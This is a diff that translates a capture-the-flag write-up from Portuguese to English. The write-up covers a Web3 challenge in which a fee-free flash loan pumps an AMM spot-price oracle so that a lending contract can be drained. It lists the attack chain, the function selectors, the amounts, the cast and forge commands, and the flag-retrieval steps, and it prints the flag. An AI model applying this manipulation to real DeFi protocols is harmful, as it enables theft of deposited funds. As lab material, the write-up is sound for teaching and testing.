@@ -6,72 +6,74 @@
 
 </div>
 
+<p align="center"><b>English</b> · <a href="WRITEUP.es.md">Español</a> · <a href="WRITEUP.pt-BR.md">Português (BR)</a></p>
+
 # Carcara Markets — WEB3 · 450 pts · 🔴 HARD
 
-- **Status:** ✅ RESOLVIDO — exploit ponta a ponta, flag obtida.
+- **Status:** ✅ SOLVED — end-to-end exploit, flag obtained.
 - **Flag:** `HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065`
-- **Flag format:** `HIK_[texto]_[md5]`
-- **Acesso:** RPC `https://<HOST>` · `GET /instance.json` (card da instância) · chainId `31337`
-- **Enunciado:** *"Tokens, a pool, a price feed, and a lending desk are on chain. Starting balances are on Setup. Make Setup.isSolved() return true."*
+- **Flag format:** `HIK_[text]_[md5]`
+- **Access:** RPC `https://<HOST>` · `GET /instance.json` (instance card) · chainId `31337`
+- **Prompt:** *"Tokens, a pool, a price feed, and a lending desk are on chain. Starting balances are on Setup. Make Setup.isSolved() return true."*
 
 ---
 
 ## 0. TL;DR
 
-1. Setup expõe `dex()`, `flash()`, `lending()`, `oracle()`, `player()`, `usd()` — sem source, tudo reconstruído via `cast call` + heimdall decompile.
-2. O "oráculo" promete TWAP (`twapPrice()`), mas essa função é uma constante decoy; o preço real usado pela lending desk é lido direto do spot price das reservas do AMM (`0x50e308f6()` = `usdReserve()*1e18/hikReserve()`), sem proteção.
-3. Flash loan de USD sem fee + swap que pump o preço do pool em ~439x + depósito do HIK comprado como colateral + borrow no LTV inflado drena a lending desk; repaga o flash loan na mesma tx e a flag sai do proof-oracle HTTP.
+1. Setup exposes `dex()`, `flash()`, `lending()`, `oracle()`, `player()`, `usd()` — no source, everything reconstructed via `cast call` + heimdall decompile.
+2. The "oracle" promises TWAP (`twapPrice()`), but that function is a decoy constant; the real price used by the lending desk is read straight from the AMM reserves' spot price (`0x50e308f6()` = `usdReserve()*1e18/hikReserve()`), with no protection.
+3. Fee-less USD flash loan + swap that pumps the pool price ~439x + deposit of the bought HIK as collateral + borrow at the inflated LTV drains the lending desk; repay the flash loan in the same tx and the flag comes out of the HTTP proof-oracle.
 
-### Cadeia que fechou
-1. `flash.flashLoan(1500e18, address(this), "")` -> empresta 1500e18 USD sem fee.
-2. `dex.call(0x8ac326bd, 1500e18, 0)` (USD-in -> HIK-out) -> reservas saem de 100/100 e preço do HIK sobe de 1e18 para ~439e18.
-3. `lending.depositCollateral(~95.2e18 HIK)` + `lending.borrow(9500e18)` -> LTV 90% sobre colateral com preço inflado permite sacar quase todo o caixa da lending desk.
-4. `usd.transfer(flash, 1500e18)` -> repaga o flash loan sem dever nada.
+### Chain that landed
+1. `flash.flashLoan(1500e18, address(this), "")` -> lends 1500e18 USD with no fee.
+2. `dex.call(0x8ac326bd, 1500e18, 0)` (USD-in -> HIK-out) -> reserves move from 100/100 and the HIK price rises from 1e18 to ~439e18.
+3. `lending.depositCollateral(~95.2e18 HIK)` + `lending.borrow(9500e18)` -> 90% LTV on collateral with inflated price lets you withdraw almost all of the lending desk's cash.
+4. `usd.transfer(flash, 1500e18)` -> repays the flash loan owing nothing.
 5. `Setup.isSolved()` -> `true` (`usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18`).
 6. `GET /ticket` -> `token = sha256(f"{ticket}:500000000000000000000")` -> `POST /flag` -> flag.
 
 ---
 
-## 1. Artefatos
+## 1. Artifacts
 
-- `instance.json` — dados da instância fixada (RPC, player, endereço do `Setup`; valores sensíveis redigidos).
-- `setup_code.hex` — bytecode runtime do `Setup`.
-- `setup_decompiled/`, `dex_decompiled/`, `lending_decompiled/`, `flash_decompiled/`, `oracle_decompiled/`, `usd_decompiled/`, `hik_decompiled/` — saídas do heimdall (decompile).
-- `dex_sol/`, `lending_sol/`, `flash_sol/`, `oracle_sol/`, `setup_sol/` — reconstrução em Solidity a partir do decompile, usada para escrever o exploit.
-- `attacker_proj/` — projeto Foundry com `src/Attacker.sol` (contrato de exploit).
+- `instance.json` — pinned instance data (RPC, player, `Setup` address; sensitive values redacted).
+- `setup_code.hex` — `Setup` runtime bytecode.
+- `setup_decompiled/`, `dex_decompiled/`, `lending_decompiled/`, `flash_decompiled/`, `oracle_decompiled/`, `usd_decompiled/`, `hik_decompiled/` — heimdall (decompile) outputs.
+- `dex_sol/`, `lending_sol/`, `flash_sol/`, `oracle_sol/`, `setup_sol/` — Solidity reconstruction from the decompile, used to write the exploit.
+- `attacker_proj/` — Foundry project with `src/Attacker.sol` (exploit contract).
 
-## 2. Entrega / validação
+## 2. Delivery / validation
 
-- `Setup.isSolved()` precisa retornar `true` on-chain (`usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18`).
-- Proof HTTP: `GET /instance.json` (cookie `hik_team`) -> exploit on-chain -> `GET /ticket` (TTL curto) -> `token = sha256(f"{ticket}:{proof}")`, onde `proof` é `usd.balanceOf(lending)` pós-exploit, em decimal -> `POST /flag {"ticket","token"}` -> `{"flag": "..."}`.
+- `Setup.isSolved()` must return `true` on-chain (`usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18`).
+- HTTP proof: `GET /instance.json` (cookie `hik_team`) -> on-chain exploit -> `GET /ticket` (short TTL) -> `token = sha256(f"{ticket}:{proof}")`, where `proof` is `usd.balanceOf(lending)` post-exploit, in decimal -> `POST /flag {"ticket","token"}` -> `{"flag": "..."}`.
 
-## 3. Análise
+## 3. Analysis
 
-### 3.1 Arquitetura dos contratos (reversed, sem source)
+### 3.1 Contract architecture (reversed, no source)
 
 Setup getters: `dex() flash() lending() oracle() player() usd()`.
 
 - **usd** (`Fake USD`/`fUSD`, 18 dec) — ERC20 "stablecoin", `minter() == Setup`.
-- **HIK token** (`0xc49330a5...`) — collateral asset, não exposto por getter do Setup (achado via `Unresolved_23b872dd(msg.sender)` no bytecode do dex/lending). Player começa com `100e18` HIK.
-- **dex** — AMM constant-product manual (sem LP token): `store_a` = reserva HIK, `store_b` = `usdReserve()`. Fee 0.3% (`997/1000`, igual Uniswap v2). Seletores reais: `0x8ac326bd(amountIn,minOut)` = swap USD-in → HIK-out; `0x1518a0ec(amountIn,minOut)` = swap HIK-in → USD-out; `getAmountOut(amountIn,reserveIn,reserveOut)`; `usdReserve()`; `0x5fad8f7c()` = reserva HIK. Reservas iniciais: `100e18` HIK / `100e18` USD (preço 1:1).
-- **oracle** — `twapPrice()` é uma constante decoy (sempre `1e18`); a função real (`0x50e308f6()`) lê spot price ao vivo: `usdReserve()*1e18/hikReserve()` do dex — sem TWAP de fato, sem proteção.
-- **lending** — `depositCollateral(uint256)` (`0xbad4a01f`, pull via `transferFrom` do HIK), `borrow(uint256)` (`0xc5ebeaec`): `debt[msg.sender]+amt <= LTV_BPS(9000) * collateral*price/1e18 / 10000`, paga em `usd`. Começa com `10000e18` USD.
-- **flash** — flash loan de usd (zero fee): `flashLoan(uint256 amount, address borrower, bytes data)` (`0x2bd94e9c`), exige `borrower` ser contrato, chama `borrower.<selector 0x79b2fae8>(amount)` de callback, e no final checa `balanceOf(this)` após `>=` antes ("unpaid" se não repagar). Começa com `2000e18` USD.
-- **Setup.isSolved()**: `usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18` — drenar a lending desk (>9000e18 USD) sem ficar devendo no flash loan.
+- **HIK token** (`0xc49330a5...`) — collateral asset, not exposed by a Setup getter (found via `Unresolved_23b872dd(msg.sender)` in the dex/lending bytecode). Player starts with `100e18` HIK.
+- **dex** — manual constant-product AMM (no LP token): `store_a` = HIK reserve, `store_b` = `usdReserve()`. Fee 0.3% (`997/1000`, same as Uniswap v2). Real selectors: `0x8ac326bd(amountIn,minOut)` = swap USD-in → HIK-out; `0x1518a0ec(amountIn,minOut)` = swap HIK-in → USD-out; `getAmountOut(amountIn,reserveIn,reserveOut)`; `usdReserve()`; `0x5fad8f7c()` = HIK reserve. Initial reserves: `100e18` HIK / `100e18` USD (price 1:1).
+- **oracle** — `twapPrice()` is a decoy constant (always `1e18`); the real function (`0x50e308f6()`) reads the live spot price: `usdReserve()*1e18/hikReserve()` from the dex — no actual TWAP, no protection.
+- **lending** — `depositCollateral(uint256)` (`0xbad4a01f`, pull via `transferFrom` of HIK), `borrow(uint256)` (`0xc5ebeaec`): `debt[msg.sender]+amt <= LTV_BPS(9000) * collateral*price/1e18 / 10000`, pays in `usd`. Starts with `10000e18` USD.
+- **flash** — usd flash loan (zero fee): `flashLoan(uint256 amount, address borrower, bytes data)` (`0x2bd94e9c`), requires `borrower` to be a contract, calls `borrower.<selector 0x79b2fae8>(amount)` as callback, and at the end checks `balanceOf(this)` after `>=` before ("unpaid" if not repaid). Starts with `2000e18` USD.
+- **Setup.isSolved()**: `usd.balanceOf(lending) < 1000e18 && usd.balanceOf(flash) >= 2000e18` — drain the lending desk (>9000e18 USD) without owing on the flash loan.
 
-### 3.2 O bug — oráculo de spot price lido direto das reservas do AMM (sem TWAP real)
+### 3.2 The bug — spot-price oracle read straight from the AMM reserves (no real TWAP)
 
-`oracle` promete TWAP (nome da função `twapPrice`, mas é uma constante morta/decoy) e na prática usa o preço instantâneo do pool `dex`. Pool fino (`100e18`/`100e18`) + flash loan de capital (`2000e18` USD, sem fee) = manipulação clássica estilo "flash-loan + spot-oracle" (Harvest/Cheese Bank/bZx-style). Não documentado antes no Arsenal — é um padrão novo, não o `web3-mint-on-swap-no-conservation-loop`.
+`oracle` promises TWAP (the function name `twapPrice`, but it's a dead/decoy constant) and in practice uses the pool's instantaneous price from `dex`. Thin pool (`100e18`/`100e18`) + capital flash loan (`2000e18` USD, no fee) = classic "flash-loan + spot-oracle" manipulation (Harvest/Cheese Bank/bZx-style). Not documented before in the Arsenal — it's a new pattern, not the `web3-mint-on-swap-no-conservation-loop`.
 
-### 3.3 Exploit — 1 tx atômica via contrato
+### 3.3 Exploit — 1 atomic tx via contract
 
 `attacker_proj/src/Attacker.sol`:
 
-1. `flash.flashLoan(1500e18, address(this), "")` → flash transfere `1500e18` USD e chama callback (`fallback()` decodificando selector `0x79b2fae8` manualmente — não existe nome textual que bata com esse 4-byte, então o fallback trata o calldata bruto em vez de tentar achar o nome real).
-2. No callback: `usd.approve(dex, 1500e18)` + `dex.call(0x8ac326bd, 1500e18, 0)` → compra HIK com todo o USD emprestado. Reservas vão de `100/100` para `~4.78 HIK / 2100 USD` → preço pula de `1e18` para `~439e18` (439x).
-3. Deposita o HIK recém-comprado (`~95.2e18`) como colateral (`lending.depositCollateral`).
-4. `lending.borrow(9500e18)` — com o preço inflado, o LTV de 90% permite emprestar muito mais que o valor real do colateral; a lending desk só tem `10000e18`, então sobra `500e18` (`<1000e18` ✓).
-5. Repaga o flash loan (`usd.transfer(flash, 1500e18)`) — flash volta para `2000e18` exatos (✓).
+1. `flash.flashLoan(1500e18, address(this), "")` → flash transfers `1500e18` USD and calls the callback (`fallback()` manually decoding selector `0x79b2fae8` — there is no text name that matches this 4-byte, so the fallback handles the raw calldata instead of trying to find the real name).
+2. In the callback: `usd.approve(dex, 1500e18)` + `dex.call(0x8ac326bd, 1500e18, 0)` → buys HIK with all the borrowed USD. Reserves go from `100/100` to `~4.78 HIK / 2100 USD` → price jumps from `1e18` to `~439e18` (439x).
+3. Deposits the freshly bought HIK (`~95.2e18`) as collateral (`lending.depositCollateral`).
+4. `lending.borrow(9500e18)` — with the inflated price, the 90% LTV lets you borrow far more than the real value of the collateral; the lending desk only has `10000e18`, so `500e18` is left over (`<1000e18` ✓).
+5. Repays the flash loan (`usd.transfer(flash, 1500e18)`) — flash goes back to exactly `2000e18` (✓).
 
 ```bash
 export PATH="$PATH:$HOME/.config/.foundry/bin"
@@ -84,32 +86,32 @@ cast send $ATTACKER "attack(uint256,uint256)" 1500000000000000000000 95000000000
 cast call $SETUP "isSolved()(bool)" --rpc-url "$RPC"   # -> true
 ```
 
-Testado antes em fork local (`anvil --fork-url $RPC`) e depois na instância real — mesmo resultado (`lending=500e18`, `flash=2000e18`, `isSolved()==true`).
+Tested first on a local fork (`anvil --fork-url $RPC`) and then on the real instance — same result (`lending=500e18`, `flash=2000e18`, `isSolved()==true`).
 
 ### 3.4 Flag — proof
 
-`proof = usd.balanceOf(lending)` após o exploit, em decimal = `"500000000000000000000"` (acertou de primeira — mesmo padrão "proof = valor exato que `isSolved()` valida, em decimal" do Night Deposit/Voucher Window).
+`proof = usd.balanceOf(lending)` after the exploit, in decimal = `"500000000000000000000"` (hit on the first try — same "proof = exact value that `isSolved()` validates, in decimal" pattern as Night Deposit/Voucher Window).
 
 ```
 GET /instance.json  (cookie hik_team)
-cast send ... (exploit acima) -> isSolved()==true
+cast send ... (exploit above) -> isSolved()==true
 GET /ticket -> {"ticket":...}
 token = sha256(f"{ticket}:500000000000000000000")
 POST /flag {"ticket","token"} -> {"flag":"HIK_WEB3_ORACLE_d6036e30b782007df2b879030f515065"}
 ```
 
-## 4. O que não funcionou
+## 4. What didn't work
 
-Não há registro de hipóteses descartadas no material original — apenas o caminho que fechou de primeira (ver 3.4).
+There is no record of discarded hypotheses in the original material — only the path that landed on the first try (see 3.4).
 
-## 5. Conclusão / próximos passos
+## 5. Conclusion / next steps
 
-Exploit fechou em 1 tx atômica: flash loan sem fee para manipular o spot price do AMM, usado diretamente como "oráculo" pela lending desk, permitindo borrow acima do colateral real. Flag confirmada pelo proof-oracle HTTP.
+The exploit landed in 1 atomic tx: a fee-less flash loan to manipulate the AMM's spot price, used directly as the "oracle" by the lending desk, allowing a borrow above the real collateral. Flag confirmed by the HTTP proof-oracle.
 
 
 ---
 
-## Apêndice — ferramentas
+## Appendix — tools
 
-- `attacker_proj/src/Attacker.sol` — contrato Foundry de exploit (flash loan + swap de pump + deposit + borrow + repay); execução via `forge create` + `cast send` (ver 3.3).
-- heimdall (decompile) sobre o bytecode runtime de cada contrato (`*_decompiled/`) para recuperar seletores e lógica sem source.
+- `attacker_proj/src/Attacker.sol` — Foundry exploit contract (flash loan + pump swap + deposit + borrow + repay); execution via `forge create` + `cast send` (see 3.3).
+- heimdall (decompile) over each contract's runtime bytecode (`*_decompiled/`) to recover selectors and logic without source.
